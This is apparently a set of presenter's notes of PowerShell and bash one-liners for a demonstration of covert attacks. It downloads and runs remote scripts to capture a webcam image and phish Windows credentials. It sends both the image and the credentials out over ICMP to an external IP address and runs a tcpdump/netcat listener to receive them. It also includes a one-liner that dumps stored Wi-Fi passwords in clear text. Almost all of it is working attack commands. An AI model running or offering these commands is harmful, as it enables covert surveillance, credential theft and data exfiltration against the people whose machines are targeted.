
# Save webcam image
# https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
iwr https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1 | iex


# ICMP exfiltration
cat .\opencv.png | % { Invoke-ICMPExfil -Target 51.38.185.232 -Payload $_ -Verbose }

## ICMP credential phish
## https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1
iwr https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1 | iex
Invoke-CredentialsPhish | % { Invoke-ICMPExfil -Target 51.38.185.232 -Payload $_ -Verbose }

# ICMP SERVER
## v1
tcpdump -i ens3 'icmp and icmp[icmptype]=icmp-echo' -lA -s 0 | grep '89-64-40-243' -A 15 | grep -v 'IP' | grep -v 'end' | grep -v 'begin' | cut -c 29-

##v2 Oneliner
bash -c "tcpdump -i ens3 'icmp and icmp[icmptype]=icmp-echo' -lA -s 0 | grep '89-64-40-243' -A 15 &> /home/bombadil/ReverseShellPresentation/icmpdump.txt" & nc -lk -p 413 && kill -9 `ps ax | grep 'tcpdump -i ens3 icmp' | awk '{print $1}'`


# Wifi password stole
## Explicit
netsh wlan show profiles | select-string ':' | % {
$n=(($_ -split ':')[1]).trim(); netsh wlan show profile
name="$n" key=clear } | select-string "Key Content","SSID
name" 

## Oneliner
netsh wlan show profiles | select-string ':' | % {$n=(($_ -split ':')[1]).trim(); netsh wlan show profile name="$n" key=clear }  | select-string "Key Content","SSID name" 

# DNS
## See TXT record
nslookup -type=TXT google.com

# Resources

# https://aptmasterclass.com/bsides19/BSides19-C2-sources.html
# Reload env
$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")

